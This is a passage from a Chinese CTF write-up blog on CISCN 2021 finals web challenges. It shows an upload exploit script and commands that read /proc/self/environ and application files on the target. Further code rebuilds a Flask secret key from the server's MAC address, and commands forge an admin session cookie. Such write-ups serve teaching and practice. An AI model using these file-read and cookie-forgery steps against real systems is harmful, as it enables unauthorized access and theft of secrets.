&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 exp.py /proc/self/environ
python3 exp.py /app/y0u_found_it.ini
python3 exp.py /app/y0u_found_it/y0u_found_it_main.py
python3 exp.py /sys/class/net/eth0/address
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png" alt="image-20211106234837193">&lt;/p>
&lt;p>exp.py - 2 根据mac地址生成伪随机数&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">uuid&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;02:42:0a:00:cb:06&amp;#34;&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">bin&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0b&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># 36.014406163923596&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 flask_session_cookie_manager3.py decode -c &lt;span style="color:#d88200">&amp;#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc&amp;#39;&lt;/span>
python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;36.014406163923596&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#34;{u&amp;#39;username&amp;#39;: u&amp;#39;admin&amp;#39;}&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235751916.png" alt="image-20211106235751916">&lt;/p>
&lt;p>翻回头看源码，好家伙这里有内鬼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235832895.png" alt="image-20211106235832895">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075450043.png" alt="image-20211107075450043">&lt;/p>
&lt;p>返回的并不是真正的flag，而是secret.secret中的内容no flah&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075326929.png" alt="image-20211107075326929">&lt;/p>
&lt;p>67行这里会对unzip打开的文件进行检查，只要含有flag字样就会重定向至/?error=1&lt;/p>
&lt;p>————这里我感觉原题应该secret.py中的&lt;code>secret=&lt;/code>直接就能读出来flag，想了好久，再绕一层flag.txt的话我是想不出来什么bypass的方法了，我倾向于是布置环境的时候没有设置这一点（&lt;/p>
&lt;h2 id="ciscn2021-总决赛easy_python">***[CISCN2021 总决赛]easy_python&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212057524.png" alt="image-20211106212057524">&lt;/p>
&lt;p>不知道是我的网络问题还是什么未知的bug……check之后就会宕机，只能重新下发靶机&lt;/p>
&lt;h2 id="ciscn2021-总决赛ezj4va">***[CISCN2021 总决赛]ezj4va&lt;/h2>
&lt;p>&lt;a href="https://juejin.cn/post/6997314123918737422">https://juejin.cn/post/6997314123918737422&lt;/a>&lt;/p>
&lt;p>还不会java 先空着TAT&lt;/p></description></item></channel></rss>